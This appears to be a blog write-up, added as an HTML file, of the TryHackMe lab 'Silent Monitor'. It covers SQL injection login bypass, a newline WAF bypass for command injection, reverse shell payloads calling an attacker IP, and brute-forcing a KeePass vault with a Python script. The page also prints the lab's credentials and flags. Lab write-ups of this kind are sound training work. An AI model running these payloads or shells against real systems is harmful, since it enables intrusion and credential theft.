@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Silent Monitor — TryHackMe Writeup — CyberMaks</title>
+  <meta name="description" content="Silent Monitor TryHackMe writeup — SQLi auth bypass in both fields, command injection with newline WAF bypass, KeePass KDBX v4 cracking with pykeepass." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0b0f14;
+      --bg-2:     #0f1419;
+      --bg-3:     #141b22;
+      --bg-code:  #0d1117;
+      --border:   #1e2730;
+      --border-2: #253040;
+      --text:     #c8d0da;
+      --text-dim: #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:   #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:    #34c759;
+      --yellow:   #ff9f0a;
+      --red:      #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 15px;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 2rem;
+      height: 56px;
+      background: rgba(11,15,20,0.85);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-brand {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--accent);
+      text-decoration: none;
+      letter-spacing: 0.04em;
+    }
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+      list-style: none;
+    }
+    .nav-links a {
+      font-size: 13px;
+      color: var(--text-dim);
+      text-decoration: none;
+      letter-spacing: 0.02em;
+      transition: color 0.15s;
+    }
+    .nav-links a:hover { color: var(--text); }
+
+    /* LAYOUT */
+    .page-wrap {
+      max-width: 780px;
+      margin: 0 auto;
+      padding: 100px 2rem 80px;
+    }
+
+    /* BACK LINK */
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-dim);
+      text-decoration: none;
+      margin-bottom: 2.5rem;
+      letter-spacing: 0.03em;
+      transition: color 0.15s;
+    }
+    .back-link:hover { color: var(--accent); }
+    .back-link svg { width: 14px; height: 14px; }
+
+    /* HEADER */
+    .post-header { margin-bottom: 2.5rem; }
+
+    .post-meta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 1rem;
+      flex-wrap: wrap;
+    }
+    .badge {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      padding: 3px 9px;
+      border-radius: 3px;
+      text-transform: uppercase;
+    }
+    .badge-platform { background: rgba(77,157,224,0.1); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-medium   { background: rgba(255,159,10,0.1);  color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .badge-tag      { background: rgba(255,255,255,0.04); color: var(--text-dim); border: 1px solid var(--border); }
+
+    .post-title {
+      font-family: var(--sans);
+      font-size: 28px;
+      font-weight: 600;
+      color: #e8edf3;
+      line-height: 1.25;
+      letter-spacing: -0.3px;
+      margin-bottom: 0.75rem;
+    }
+    .post-date {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      letter-spacing: 0.04em;
+    }
+
+    /* DIVIDER */
+    .divider {
+      height: 1px;
+      background: var(--border);
+      margin: 2rem 0;
+    }
+
+    /* FLAGS TABLE */
+    .flags-block {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1.25rem 1.5rem;
+      margin-bottom: 2rem;
+    }
+    .flags-block h3 {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 1rem;
+    }
+    .flags-table { width: 100%; border-collapse: collapse; }
+    .flags-table td {
+      padding: 6px 0;
+      font-family: var(--mono);
+      font-size: 13px;
+      border-bottom: 1px solid var(--border);
+    }
+    .flags-table tr:last-child td { border-bottom: none; }
+    .flags-table td:first-child {
+      color: var(--text-dim);
+      width: 60px;
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .flags-table td:last-child {
+      color: var(--green);
+      word-break: break-all;
+    }
+
+    /* ATTACK CHAIN */
+    .chain-block {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-left: 2px solid var(--accent);
+      border-radius: 6px;
+      padding: 1.25rem 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+    .chain-block h3 {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 1rem;
+    }
+    .chain-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .chain-step:last-child { margin-bottom: 0; }
+    .chain-arrow {
+      font-family: var(--mono);
+      color: var(--accent-dim);
+      font-size: 12px;
+      padding-top: 1px;
+      flex-shrink: 0;
+    }
+    .chain-text {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--text);
+      line-height: 1.5;
+    }
+
+    /* SECTION HEADINGS */
+    .section {
+      margin-bottom: 2.5rem;
+    }
+    .section-num {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 0.08em;
+      margin-bottom: 4px;
+    }
+    h2 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #e8edf3;
+      letter-spacing: -0.2px;
+      margin-bottom: 1rem;
+    }
+    p { color: var(--text); margin-bottom: 0.85rem; }
+    p:last-child { margin-bottom: 0; }
+
+    /* CALLOUT */
+    .callout {
+      background: rgba(77,157,224,0.06);
+      border: 1px solid rgba(77,157,224,0.15);
+      border-left: 2px solid var(--accent);
+      border-radius: 4px;
+      padding: 0.85rem 1.1rem;
+      font-size: 13.5px;
+      color: var(--text);
+      margin: 1rem 0;
+    }
+    .callout.warn {
+      background: rgba(255,159,10,0.06);
+      border-color: rgba(255,159,10,0.15);
+      border-left-color: var(--yellow);
+    }
+    .callout.tip {
+      background: rgba(52,199,89,0.06);
+      border-color: rgba(52,199,89,0.15);
+      border-left-color: var(--green);
+    }
+
+    /* PORT TABLE */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1rem 0;
+      font-size: 13.5px;
+    }
+    thead tr {
+      border-bottom: 1px solid var(--border-2);
+    }
+    th {
+      font-family: var(--mono);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.07em;
+      color: var(--text-dim);
+      text-align: left;
+      padding: 8px 12px 8px 0;
+      font-weight: 400;
+    }
+    td {
+      padding: 8px 12px 8px 0;
+      color: var(--text);
+      border-bottom: 1px solid var(--border);
+      font-family: var(--mono);
+      font-size: 13px;
+    }
+    tbody tr:last-child td { border-bottom: none; }
+    td:first-child { color: var(--accent); }
+
+    /* CODE BLOCKS */
+    .code-block {
+      position: relative;
+      margin: 1rem 0;
+    }
+    .code-label {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-bottom: none;
+      border-radius: 5px 5px 0 0;
+      padding: 6px 12px;
+    }
+    .code-lang {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-faint);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .copy-btn {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      background: none;
+      border: none;
+      cursor: pointer;
+      letter-spacing: 0.04em;
+      transition: color 0.15s;
+      padding: 2px 4px;
+    }
+    .copy-btn:hover { color: var(--accent); }
+    pre {
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: 0 0 5px 5px;
+      padding: 1rem 1.1rem;
+      overflow-x: auto;
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.65;
+      color: var(--text);
+    }
+    .code-block-plain pre {
+      border-radius: 5px;
+    }
+    code {
+      font-family: var(--mono);
+      font-size: 12.5px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid var(--border);
+      padding: 1px 5px;
+      border-radius: 3px;
+      color: var(--text);
+    }
+
+    /* COMMENT LINES */
+    .cm { color: var(--text-faint); }
+    .kw { color: var(--accent); }
+    .st { color: #a8d8a8; }
+    .nu { color: var(--yellow); }
+    .fn { color: #e0c9f5; }
+
+    /* CREDS TABLE at bottom */
+    .creds-table td:first-child { color: var(--text-dim); }
+    .creds-table td:nth-child(2) { color: var(--red); }
+    .creds-table td:nth-child(3) { color: var(--text-dim); font-size: 12px; }
+
+    /* TAKEAWAYS */
+    .takeaway {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      margin-bottom: 0.75rem;
+    }
+    .takeaway:last-child { margin-bottom: 0; }
+    .takeaway-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: var(--accent);
+      flex-shrink: 0;
+      margin-top: 8px;
+    }
+    .takeaway-text { font-size: 14px; color: var(--text); }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--border);
+      margin-top: 4rem;
+      padding-top: 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .footer-brand {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+    }
+    .footer-links {
+      display: flex;
+      gap: 1.5rem;
+    }
+    .footer-links a {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+    .footer-links a:hover { color: var(--accent); }
+
+    @media (max-width: 600px) {
+      .nav-links { display: none; }
+      .post-title { font-size: 22px; }
+      footer { flex-direction: column; gap: 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-brand" href="/">CyberMaks</a>
+  <ul class="nav-links">
+    <li><a href="/#cases">Case Studies</a></li>
+    <li><a href="/methodology.html">Methodology</a></li>
+    <li><a href="/about.html">About</a></li>
+    <li><a href="/contact.html">Contact</a></li>
+  </ul>
+</nav>
+
+<div class="page-wrap">
+
+  <a class="back-link" href="/">
+    <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M10 3L5 8l5 5"/>
+    </svg>
+    Case Studies
+  </a>
+
+  <header class="post-header">
+    <div class="post-meta">
+      <span class="badge badge-platform">TryHackMe</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="badge badge-tag">sqli</span>
+      <span class="badge badge-tag">cmd-injection</span>
+      <span class="badge badge-tag">waf-bypass</span>
+      <span class="badge badge-tag">keepass</span>
+    </div>
+    <h1 class="post-title">Silent Monitor</h1>
+    <div class="post-date">2026-05-23</div>
+  </header>
+
+  <div class="flags-block">
+    <h3>Flags</h3>
+    <table class="flags-table">
+      <tr>
+        <td>User</td>
+        <td>THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}</td>
+      </tr>
+      <tr>
+        <td>Root</td>
+        <td>THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="chain-block">
+    <h3>Attack Chain</h3>
+    <div class="chain-step"><span class="chain-arrow">01</span><span class="chain-text">SQLi auth bypass (username + password fields)</span></div>
+    <div class="chain-step"><span class="chain-arrow">02</span><span class="chain-text">Command injection via <code>%0a</code> newline — WAF bypass</span></div>
+    <div class="chain-step"><span class="chain-arrow">03</span><span class="chain-text">www-data shell → secret.config → sysadmin creds</span></div>
+    <div class="chain-step"><span class="chain-arrow">04</span><span class="chain-text">SSH as sysadmin → user flag → infrastructure.kdbx</span></div>
+    <div class="chain-step"><span class="chain-arrow">05</span><span class="chain-text">pykeepass brute (KDBX v4) → password: spring → root creds</span></div>
+    <div class="chain-step"><span class="chain-arrow">06</span><span class="chain-text">su root → root flag</span></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- SECTION 1 -->
+  <div class="section">
+    <div class="section-num">01 — Recon</div>
+    <h2>Nmap</h2>
+    <p>Standard stealth scan across all ports. Only two services exposed — SSH and a Python web app running on a non-standard port.</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>sudo nmap -sS -sV -sC 10.48.180.35 -p- -T4</pre>
+    </div>
+    <table>
+      <thead><tr><th>Port</th><th>Service</th></tr></thead>
+      <tbody>
+        <tr><td>22</td><td>OpenSSH 8.9p1 Ubuntu</td></tr>
+        <tr><td>5050</td><td>Werkzeug 2.0.2 / Python 3.10.12</td></tr>
+      </tbody>
+    </table>
+    <p>Werkzeug on port 5050 immediately suggests a Flask app. Combined with the machine name "Silent Monitor", this looks like an internal network ops panel — exactly the kind of thing someone locks behind a login form and then forgets to parameterize.</p>
+  </div>
+
+  <!-- SECTION 2 -->
+  <div class="section">
+    <div class="section-num">02 — Web Recon</div>
+    <h2>Fingerprinting the app</h2>
+    <p>The app lives at <code>http://10.48.180.35:5050</code>. The login panel is at <code>/internal</code> — cute name for an internal tool they clearly didn't want us to find. WAF and rate limiting are active, so brute force is off the table.</p>
+    <div class="callout warn">WAF blocks common tool signatures and rate-limits requests. Manual, precise payloads only.</div>
+  </div>
+
+  <!-- SECTION 3 -->
+  <div class="section">
+    <div class="section-num">03 — Initial Access</div>
+    <h2>SQL Injection — Auth Bypass</h2>
+    <p>The login form at <code>/internal/login</code> was the obvious first target. The classic sanity check: does this thing even sanitize its inputs?</p>
+
+    <div class="callout">
+      Both the <strong>username</strong> and <strong>password</strong> fields are injectable. The payload works in either — or both simultaneously. The backend query was likely something like <code>WHERE username='$u' AND password='$p'</code> — meaning either field can short-circuit the whole condition.
+    </div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">http</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>POST /internal/login
+
+username=<span class="st">' OR 1=1--</span>
+password=<span class="st">anything</span>
+
+<span class="cm"># OR inject password field instead:</span>
+username=<span class="st">anything</span>
+password=<span class="st">' OR 1=1--</span>
+
+<span class="cm"># OR hit both at once for maximum commitment:</span>
+username=<span class="st">' OR 1=1--</span>
+password=<span class="st">' OR 1=1--</span></pre>
+    </div>
+
+    <p>Logged in as <code>netops</code> — an operator-level account. Not admin, but enough to reach the health check endpoint that's about to become our best friend.</p>
+    <div class="callout tip">The "operator" role had access to a diagnostics panel. Always check what low-privilege authenticated users can reach before escalating auth — sometimes the prize is already in front of you.</div>
+  </div>
+
+  <!-- SECTION 4 -->
+  <div class="section">
+    <div class="section-num">04 — RCE</div>
+    <h2>Command Injection — WAF Bypass via <code>%0a</code></h2>
+    <p>The <code>POST /internal/health</code> endpoint takes a <code>target</code> parameter and runs <code>ping -c 2 -W 1 &lt;target&gt;</code>. Classic shell composition vulnerability. The WAF blocks <code>|</code>, <code>;</code>, <code>&amp;</code>, and spaces — the usual suspects.</p>
+    <p>What it <em>doesn't</em> block: URL-encoded newlines. Flask decodes <code>%0a</code> before the input ever reaches the WAF regex, so the injected newline creates a second shell command that executes clean.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">http — burp raw editor</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="cm"># Confirm execution</span>
+target=<span class="st">127.0.0.1%0awhoami</span>
+
+<span class="cm"># Read the config file</span>
+target=<span class="st">127.0.0.1%0acat+secret.config</span>
+
+<span class="cm"># Reverse shell — busybox nc</span>
+target=<span class="st">127.0.0.1%0abusybox+nc+192.168.200.104+7777+-e+/bin/sh</span>
+
+<span class="cm"># Or Python if busybox isn't available</span>
+target=<span class="st">127.0.0.1%0apython3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("192.168.200.104",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — listener</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>nc -lvnp <span class="nu">7777</span></pre>
+    </div>
+
+    <p>Shell lands as <code>www-data</code>. Not root, not even a real user — but enough to read files the web process has access to.</p>
+    <div class="callout warn">The WAF validated characters but didn't account for URL decoding happening upstream. This is a framework-level issue — Flask decodes the request body before any application-layer filtering. The WAF was checking the <em>encoded</em> string, not the actual value.</div>
+  </div>
+
+  <!-- SECTION 5 -->
+  <div class="section">
+    <div class="section-num">05 — Privilege Escalation</div>
+    <h2>www-data → sysadmin</h2>
+    <p>With a shell as <code>www-data</code>, the first instinct is to look at what the web app itself has access to. Config files are a natural starting point — especially in Python apps where credentials often live in <code>.ini</code> or <code>.config</code> files right next to the application.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">ini — /opt/netops/secret.config</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>[backup_agent]
+run_as   = <span class="st">sysadmin</span>
+password = <span class="st">S3cur3Backup$Acc3ss!</span></pre>
+    </div>
+
+    <p>Credentials in plaintext. In a config file. Owned by the web process. Bold strategy.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ssh sysadmin@10.48.180.35
+<span class="cm"># password: S3cur3Backup$Acc3ss!</span></pre>
+    </div>
+
+    <p>User flag located at the usual spot. Also found <code>~/backups/infrastructure.kdbx</code> — a KeePass database. Things are getting interesting.</p>
+  </div>
+
+  <!-- SECTION 6 -->
+  <div class="section">
+    <div class="section-num">06 — Post Exploitation</div>
+    <h2>KeePass Database — KDBX v4</h2>
+    <p>Exfil the database first:</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>scp sysadmin@10.48.180.35:/home/sysadmin/backups/infrastructure.kdbx .</pre>
+    </div>
+
+    <div class="callout warn"><strong>keepass2john fails silently on KDBX v4.</strong> The tool was written for v3.1 format — v4 uses Argon2 KDF and a different file structure. If you're getting no output or garbage, check the file header. Use <code>pykeepass</code> instead.</div>
+
+    <p>Setting up the brute force environment:</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — fish shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>python3 -m venv ./venv
+source ./venv/bin/activate.fish
+pip install pykeepass</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">python — crack.py</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="kw">from</span> pykeepass <span class="kw">import</span> PyKeePass
+<span class="kw">from</span> pykeepass.exceptions <span class="kw">import</span> CredentialsError
+
+<span class="kw">with</span> <span class="fn">open</span>(<span class="st">"/home/cybermaksx/Downloads/rockyou.txt"</span>, <span class="st">"rb"</span>) <span class="kw">as</span> f:
+    <span class="kw">for</span> line <span class="kw">in</span> f:
+        p = line.<span class="fn">strip</span>().<span class="fn">decode</span>(<span class="st">"utf-8"</span>, <span class="st">"ignore"</span>)
+        <span class="kw">try</span>:
+            <span class="fn">PyKeePass</span>(<span class="st">"infrastructure.kdbx"</span>, password=p)
+            <span class="fn">print</span>(f<span class="st">"[+] FOUND: {p}"</span>)
+            <span class="kw">break</span>
+        <span class="kw">except</span> CredentialsError:
+            <span class="kw">pass</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">output</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>[+] FOUND: <span class="st">spring</span></pre>
+    </div>
+
+    <p>The sysadmin who runs an internal infrastructure monitoring platform, stores root credentials in KeePass, and locks it with the password <code>spring</code>. Truly a legend of our time.</p>
+
+    <p>Dump all entries:</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">python</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="kw">from</span> pykeepass <span class="kw">import</span> PyKeePass
+kp = <span class="fn">PyKeePass</span>(<span class="st">"infrastructure.kdbx"</span>, password=<span class="st">"spring"</span>)
+<span class="kw">for</span> e <span class="kw">in</span> kp.entries:
+    <span class="fn">print</span>(e.title, e.username, e.password)</pre>
+    </div>
+
+    <table>
+      <thead><tr><th>Title</th><th>Username</th><th>Password</th></tr></thead>
+      <tbody>
+        <tr><td>Root User Password - Sensitive</td><td>root</td><td>S3cur3P4ss0nK33p4ss</td></tr>
+        <tr><td>Sample Entry #2</td><td>Michael321</td><td>12345</td></tr>
+      </tbody>
+    </table>
+
+    <p>Michael321 stays in his lane. Root does not.</p>
+  </div>
+
+  <!-- SECTION 7 -->
+  <div class="section">
+    <div class="section-num">07 — Root</div>
+    <h2>Privilege Escalation → root</h2>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>su root
+<span class="cm"># password: S3cur3P4ss0nK33p4ss</span>
+
+cat /root/root.txt
+<span class="cm"># THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}</span></pre>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- CREDS SUMMARY -->
+  <div class="section">
+    <div class="section-num">Summary</div>
+    <h2>Credentials</h2>
+    <table class="creds-table">
+      <thead><tr><th>User</th><th>Password / Method</th><th>Source</th></tr></thead>
+      <tbody>
+        <tr><td>netops (web)</td><td>' OR 1=1--</td><td>SQLi auth bypass</td></tr>
+        <tr><td>sysadmin</td><td>S3cur3Backup$Acc3ss!</td><td>secret.config</td></tr>
+        <tr><td>KeePass</td><td>spring</td><td>rockyou brute (pykeepass)</td></tr>
+        <tr><td>root</td><td>S3cur3P4ss0nK33p4ss</td><td>KeePass entry</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- TAKEAWAYS -->
+  <div class="section">
+    <h2>Key Takeaways</h2>
+    <div class="takeaway"><div class="takeaway-dot"></div><div class="takeaway-text">The WAF validated raw characters but didn't account for URL decoding happening upstream in Flask — <code>%0a</code> slipped through as a literal newline after decode. Always test encoded variants of blocked characters.</div></div>
+    <div class="takeaway"><div class="takeaway-dot"></div><div class="takeaway-text">Both form fields were injectable — not just username. Test every input that touches a query, including the one developers assume is "just the password".</div></div>
+    <div class="takeaway"><div class="takeaway-dot"></div><div class="takeaway-text">KDBX v4 breaks <code>keepass2john</code>. Check the file format before wasting time. <code>pykeepass</code> handles v4 natively and is trivial to script.</div></div>
+    <div class="takeaway"><div class="takeaway-dot"></div><div class="takeaway-text">Credentials in config files under the web root are a recurring privilege escalation path. <code>/opt/</code>, <code>/var/www/</code>, <code>/srv/</code> — all worth a thorough read when you land as <code>www-data</code>.</div></div>
+  </div>
+
+  <footer>
+    <span class="footer-brand">cybermaksx.com</span>
+    <div class="footer-links">
+      <a href="https://github.com/cybermaksx" target="_blank">GitHub</a>
+      <a href="https://linkedin.com" target="_blank">LinkedIn</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copied';
+      setTimeout(() => btn.textContent = 'copy', 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
